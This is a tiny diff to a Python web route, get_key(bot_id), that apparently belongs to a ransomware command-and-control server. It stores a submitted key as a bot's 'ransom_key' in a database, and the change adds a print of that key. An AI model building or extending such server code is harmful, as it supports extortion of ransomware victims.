@@ -68,6 +68,7 @@ def get_key(bot_id):
 	if not bot:
 		abort(404)
 	key = request.form['key']
+	print(key)
 	bot.ransom_key = key
 	db.session.add(bot)
 	db.session.commit()
